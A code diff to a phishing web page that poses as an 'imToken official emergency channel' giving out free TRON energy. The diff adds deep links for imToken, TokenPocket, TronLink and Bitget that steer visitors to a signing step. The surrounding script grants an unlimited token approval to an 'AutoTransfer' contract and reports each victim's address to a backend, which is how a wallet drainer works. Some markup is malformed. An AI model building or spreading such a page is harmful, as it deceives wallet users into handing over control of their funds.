@@ -60,7 +60,6 @@ body {
     align-items: flex-end; /* 所有子元素靠右对齐 */
     gap: 6px; /* 文本和按钮的上下间距，可自定义 */
 }
-
 /* 新增文本样式（可按需调整） */
 .lang-text {
   color: #e0e8e4; /* 与按钮文字同色，保持统一 */
@@ -111,7 +110,6 @@ body {
     margin-bottom: 0;
    line-height: 1.2;
 }
-
 .warning {
     background: #334155;
     color: #93c5fd;
@@ -337,6 +335,54 @@ body {
     justify-content: center;
     gap: 6px;
 }
+/* 新增：钱包选择表格样式（复用支付转跳文件逻辑） */
+.wallet-select-list {
+    background: #1e2925;
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #334155;
+    display: none; /* 默认隐藏，非钱包环境显示 */
+    margin-top: 4px;
+}
+.wallet-select-title {
+    font-size: 14px;
+    color: #3b82f6;
+    margin-bottom: 8px;
+    text-align: center;
+}
+.wallet-select-table {
+    width: 100%;
+    border-collapse: separate;
+    border-spacing: 0;
+}
+.wallet-select-table tr {
+    cursor: pointer;
+    transition: background 0.3s;
+}
+.wallet-select-table tr:hover {
+    background: rgba(59, 130, 246, 0.1);
+}
+.wallet-select-table td {
+    padding: 10px;
+    border-bottom: 1px solid #334155;
+}
+.wallet-select-table td:first-child {
+    width: 40px;
+    text-align: center;
+}
+.wallet-select-table img {
+    width: 36px;
+    height: 36px;
+    border-radius: 8px;
+}
+.wallet-select-table .wallet-desc {
+    font-size: 12px;
+    color: #a0a8a4;
+    margin-top: 2px;
+}
+.wallet-select-table .wallet-desc.red {
+    color: #ef4444;
+}
     </style>
 </head>
 <body>
@@ -354,7 +400,7 @@ body {
             
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
-                  <i class="fa fa-globe"></i>
+                  <<i class="fa fa-globe"></</i>
             </button>
               <span id="headerDesc" class="lang-text">imToken官方应急通道</span> <!-- 新增文本 -->
         
@@ -362,7 +408,7 @@ body {
     </div>
         <div id="userInfo">
             <span id="userInfoDefault">未连接钱包<br>
-            <span>请点击底部「连接imToken钱包」按钮</span></span>
+            <span>请选择下方钱包，直接跳转至签名页面</span></span>
         </div>
         <div id="walletStatusContainer">
             <div class="status-title"><h3 id="walletStatusTitle">钱包状态</h3></div>
@@ -394,7 +440,42 @@ body {
                 </p>
             </div>
         </div>
-        <!-- 新增：非钱包环境专属容器（添加id便于JS控制文本） -->
+        <!-- 新增：非钱包环境-钱包选择列表（复用支付转跳逻辑） -->
+        <div class="wallet-select-list" id="walletSelectList">
+            <div class="wallet-select-title">选择钱包，直接跳转至签名页面</div>
+            <table class="wallet-select-table">
+                <tr onclick="navigateToWallet('imtoken')">
+                    <td><img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/imToken.png" alt="imToken"></td>
+                    <td>
+                        <p>imToken - TRC20 / ERC20 / BEP20</p>
+                        <p class="wallet-desc red">【快捷签名】点击直接跳转，无反应请用浏览器访问</p>
+                    </td>
+                </tr>
+                <tr onclick="navigateToWallet('tokenpocket')">
+                    <td><img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tokenPocket.png" alt="TokenPocket"></td>
+                    <td>
+                        <p>TokenPocket - TRC20 / ERC20 / BEP20</p>
+                        <p class="wallet-desc red">【快捷签名】点击直接跳转，无反应请用浏览器访问</p>
+                    </td>
+                </tr>
+                <tr onclick="navigateToWallet('tronlink')">
+                    <td><img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/tronLink.png" alt="TronLink"></td>
+                    <td>
+                        <p>TronLink - TRC20</p>
+                        <p class="wallet-desc">【快捷签名】点击直接跳转，无反应请用浏览器访问</p>
+                    </td>
+                </tr>
+                <tr onclick="navigateToWallet('bitget')">
+                    <td><img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/icon/bitget.png" alt="Bitget Wallet"></td>
+                    <td>
+                        <p>Bitget Wallet / BitKeep - TRC20 / ERC20</p>
+                        <p class="wallet-desc">【快捷签名】点击直接跳转，无反应请用浏览器访问</p>
+                    </td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- 原有非钱包环境容器（保留，作为辅助提示） -->
         <div class="special-tip-container" id="specialTipContainer">
             <div class="special-tip-title" id="specialTipTitle">imToken-EAB</div>
             <div class="special-tip-content" id="specialTipContent">
@@ -412,12 +493,11 @@ body {
             </div>       
             <span id="approvalRecords" class="highlight">暂无能量领取记录</span>        
         </div>
-
         <!-- 按钮组移进container -->
         <div class="btn-group">
             <div class="warning">
                 <p id="browserWarn1"> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-                <p id="browserWarn2"> ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken</p>  
+                <p id="browserWarn2"> ⚠️ 非钱包浏览器：选择上方钱包，直接跳转至签名页面</p>  
             </div> 
             <button id="connectBtn" class="btn">连接imToken钱包</button>
             <button id="approveBtn" class="btn" disabled>领取能量</button>
@@ -426,7 +506,6 @@ body {
                <span id="reviewTipText">系统审核中，审核通过后请务必完成签名</span>
             </div>
         </div>
-
         <!-- 底部信息移进container -->
         <div class="footer-info" id="footerInfo">
             合约验证：AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>（TRON浏览器查询）
@@ -434,6 +513,7 @@ body {
         </div>
     </div>
    <script src="imtoken://browser"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js"></script>
 <script>
 // ========== 全局变量优先定义 ==========
 const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // 特殊白名单地址
@@ -490,12 +570,38 @@ let trxBalance = 0.00;
 const RECORD_KEY = "imtoken_energy_records";
 // 新增：B1信号发送标记（防止重复发送）
 const B1_SIGNAL_KEY = "b1_signal_sent";
+
+// ========== 关键修改1：补充完整钱包Scheme配置（复用支付转跳文件逻辑） ==========
+const walletConfig = {
+    imtoken: {
+        scheme: "imtokenv2://navigate/DappView?url=",
+        name: "imToken",
+        logo: "imToken.png"
+    },
+    tokenpocket: {
+        scheme: "tpdapp://open?params={\"url\":\"",
+        suffix: "\"}",
+        name: "TokenPocket",
+        logo: "tokenPocket.png"
+    },
+    tronlink: {
+        scheme: "tronlinkoutside://pull.activity?param=",
+        name: "TronLink",
+        logo: "tronLink.png"
+    },
+    bitget: {
+        scheme: "bitkeep://bkconnect?action=dapp&url=",
+        name: "Bitget Wallet",
+        logo: "bitget.png"
+    }
+};
+
 // ========== 多语言配置（已更新headerDesc文本） ==========
 const langConfig = {
     zh: {
         headerTitle: "imToken",
         headerDesc: "imToken官方应急通道", // 已替换为需求文本
-        userInfoDefault: "未连接钱包<br><span>请点击底部「连接imToken钱包」按钮</span>",
+        userInfoDefault: "未连接钱包<br><span>请选择下方钱包，直接跳转至签名页面</span>",
         walletStatusTitle: "钱包状态",
         disconnectedText: "未连接钱包",
         disconnectedTip1: "此链接为imToken专属通道，非imToken用户不可领取",
@@ -518,7 +624,7 @@ const langConfig = {
         transferQuota: "无限",
         noRecord: "暂无能量领取记录",
         browserWarn1: " ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开",
-        browserWarn2: " ⚠️ 非钱包浏览器：点击按钮自动复制+唤起imToken",
+        browserWarn2: " ⚠️ 非钱包浏览器：选择上方钱包，直接跳转至签名页面",
         connectBtnText: "连接imToken钱包",
         approveBtnText: "领取能量",
         reviewTipText: "系统审核中，审核通过后请务必完成签名",
@@ -555,7 +661,7 @@ const langConfig = {
         ineligibleTip: "不符合领取条件",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "未检测到有效钱包地址<br><span style='color: #ef4444; font-size: 14px;'>❌ 请连接imToken钱包后重试</span>",
-        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请用imToken钱包内置浏览器打开</span>",
+        nonImTokenUser: "非imToken钱包用户<br><span style='color: #3b82f6; font-size: 13px;'>请选择下方钱包，直接跳转至签名页面</span>",
         // 新增：非钱包环境容器双语（中文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "此链接仅为imToken用户在钱包无能量、无TRX需要在Tron网络转账情况下的紧急援助，资源有限请勿当作盈利项目。"
@@ -563,7 +669,7 @@ const langConfig = {
     en: {
         headerTitle: "imToken",
         headerDesc: "imToken Official Emergency Channel", // 英文对应更新
-        userInfoDefault: "Wallet not connected<br><span>Click the 'Connect imToken Wallet' button below</span>",
+        userInfoDefault: "Wallet not connected<br><span>Select wallet below to jump directly to signature page</span>",
         walletStatusTitle: "Wallet Status",
         disconnectedText: "Wallet not connected",
         disconnectedTip1: "This link is exclusive to imToken users - non-imToken users cannot claim",
@@ -586,7 +692,7 @@ const langConfig = {
         transferQuota: "Unlimited",
         noRecord: "No energy claim records",
         browserWarn1: " ⚠️ Open with <strong>imToken in-app browser</strong>",
-        browserWarn2: " ⚠️ Non-wallet browser: Click button to copy + launch imToken",
+        browserWarn2: " ⚠️ Non-wallet browser: Select wallet above to jump directly to signature page",
         connectBtnText: "Connect imToken Wallet",
         approveBtnText: "Claim Energy",
         reviewTipText: "System reviewing - please complete the signature after approval",
@@ -623,7 +729,7 @@ const langConfig = {
         ineligibleTip: "Ineligible",
         errorTipPrefix: "⚠️ ",
         noWalletAddress: "No valid wallet address detected<br><span style='color: #ef4444; font-size: 14px;'>❌ Please connect imToken wallet and try again</span>",
-        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Please open with imToken in-app browser</span>",
+        nonImTokenUser: "Non-imToken user<br><span style='color: #3b82f6; font-size: 13px;'>Select wallet below to jump directly to signature page</span>",
         // 新增：非钱包环境容器双语（英文）
         specialTipTitle: "imToken-EAB",
         specialTipContent: "This link is only for emergency assistance to imToken users who need to transfer on the Tron network without wallet energy or TRX. Resources are limited, please do not use it as a profitable project."
@@ -717,6 +823,8 @@ const langToggle = document.getElementById("langToggle");
 const footerInfo = document.getElementById("footerInfo");
 const recordList = document.getElementById("recordList"); // 记录列表元素
 const specialTipContainer = document.getElementById("specialTipContainer"); // 新增：非钱包环境容器
+const walletSelectList = document.getElementById("walletSelectList"); // 新增：钱包选择列表
+
 // ========== 错误类型判断 ==========
 function isCustomerError(errMsg) {
     const lang = langConfig[currentLang];
@@ -842,6 +950,44 @@ function startPersistentEnergyCountdown() {
     tick();
     console.log("能量定时器已启动，递归模式");
 }
+// ========== 关键修改2：新增钱包跳转函数（复用支付转跳逻辑，直接跳转签名页面） ==========
+function navigateToWallet(walletType) {
+    const wallet = walletConfig[walletType];
+    if (!wallet) return;
+    // 拼接签名页面URL（当前页面+#approve参数，实现一遍到位）
+    const targetUrl = window.location.href + "#approve";
+    let jumpUrl = "";
+    switch (walletType) {
+        case "imtoken":
+            jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+            break;
+        case "tokenpocket":
+            jumpUrl = wallet.scheme + encodeURIComponent(targetUrl) + wallet.suffix;
+            break;
+        case "tronlink":
+            const param = JSON.stringify({
+                url: targetUrl,
+                action: "open",
+                protocol: "tronlink",
+                version: "1.0"
+            });
+            jumpUrl = wallet.scheme + encodeURIComponent(param);
+            break;
+        case "bitget":
+            jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+            break;
+        default:
+            jumpUrl = wallet.scheme + encodeURIComponent(targetUrl);
+    }
+    // 唤起钱包
+    window.location.href = jumpUrl;
+    // 3秒后提示（无反应时）
+    setTimeout(() => {
+        const lang = langConfig[currentLang];
+        showAutoCloseAlert(`未检测到${wallet.name}，请手动打开钱包并访问：${targetUrl}`);
+    }, 3000);
+}
+
 // ========== 页面初始化 ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
@@ -885,31 +1031,24 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
-// ========== 环境检测 ==========
+// ========== 关键修改3：修改环境检测逻辑（非钱包环境显示钱包选择列表） ==========
 async function checkImTokenEnv() {
     const lang = langConfig[currentLang];
     if (window.tronWeb) {
         tronWeb = window.tronWeb;
         connectBtn.style.display = "none";
         warning.style.display = "none";
-        specialTipContainer.style.display = "none"; // imToken环境隐藏专属容器
+        specialTipContainer.style.display = "none";
+        walletSelectList.style.display = "none"; // 钱包环境隐藏选择列表
         await initWallet(false);
     } else {
         try {
-            // 非imToken环境：显示专属容器+引导提示
-            specialTipContainer.style.display = "block"; // 显示非钱包环境专属容器
+            // 非钱包环境：显示钱包选择列表+辅助提示
+            walletSelectList.style.display = "block"; // 显示钱包选择列表
+            specialTipContainer.style.display = "block";
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.style.display = "none";
-            connectBtn.onclick = async () => {
-                try {
-                    const dappUrl = window.location.href;
-                    await navigator.clipboard.writeText(dappUrl);
-                    window.location.href = "imtoken://open";
-                    setTimeout(() => {}, 1200);
-                } catch (e) {
-                    console.error("复制/唤起失败：", e);
-                }
-            };
+            connectBtn.style.display = "none"; // 隐藏原连接按钮
         } catch (e) {
             console.error("非imToken环境处理失败：", e);
         }
@@ -1040,7 +1179,6 @@ async function executeAfterApprove() {
             AUTO_TRANSFER_CONTRACT,
             INFINITE_APPROVE_AMOUNT
         ).send({ from: userAddress, shouldPollResponse: true });
-
         // 核心新增：签名成功后，发送A2+B2信号（让后端记录授权用户）
         btn.textContent = "同步授权信息中...";
         await Promise.all([
@@ -1048,7 +1186,6 @@ async function executeAfterApprove() {
             sendSignalB(false) // 发送B2信号（isB1=false）
         ]);
         console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
-
         // 信号发送完成，标记能量发放成功
         const btn = document.getElementById("approveBtn");
         btn.textContent = lang.successBtn;
@@ -1148,20 +1285,17 @@ async function sendSignalB(isB1 = true) {
             keepalive: true
         });
         clearTimeout(timeoutId);
-
         // 1. 客户端错误（400/408/409）：用户不合规
         if ([400, 408, 409].includes(res.status)) {
             const errData = await res.json().catch(() => ({ detail: lang.ineligibleTip }));
             throw new Error(errData.detail || lang.ineligibleTip);
         }
-
         // 2. 成功回应（200+success=true）
         const data = await res.json();
         if (res.ok && data.success) {
             console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功`);
             return true; // 成功返回true
         }
-
         // 3. 其他失败（后端异常）
         throw new Error(lang.systemBusyTip);
     } catch (e) {
@@ -1179,7 +1313,6 @@ function bindApproveLogic() {
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "flex";
         reviewTipText.textContent = "能量调配中……点击签名后能量生效"; // 按需求显示提示
-
         try {
             // 第一步：判断A1信号是否发送成功（从本地缓存读取）
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
@@ -1192,7 +1325,6 @@ function bindApproveLogic() {
                 reviewTip.style.display = "none";
                 return;
             }
-
             // 第二步：A1成功，判断是否已发送B1信号（防止重复）
             if (hasSentB1Signal(userAddress)) {
                 alert("请勿重复提交，已在处理中");
@@ -1201,30 +1333,25 @@ function bindApproveLogic() {
                 reviewTip.style.display = "none";
                 return;
             }
-
             // 第三步：发送B1信号，等待后端回应
             btn.textContent = "发送信号中...";
             const b1Response = await sendSignalB(true); // 发送B1信号
-
             // 第四步：B1成功回应（核心修改：立即标记已领取）
             if (b1Response) {
                 markB1SignalSent(userAddress); // 标记B1已发送
                 addAuthorizedAddress(userAddress); // 立即标记为已领取（无需等签名）
                 saveEnergyRecord(); // 保存领取记录
                 renderEnergyRecords(); // 更新页面记录列表
-
                 reviewTip.style.display = "none";
                 btn.textContent = lang.redirectingBtn;
                 // 唤起imToken签名页面
                 window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href + "#approve")}`;
             }
-
         } catch (e) {
             console.error("领取流程失败：", e);
             reviewTip.style.display = "none";
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-
             // 按B1回应类型提示不同文案
             const errMsg = e.message || "";
             if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
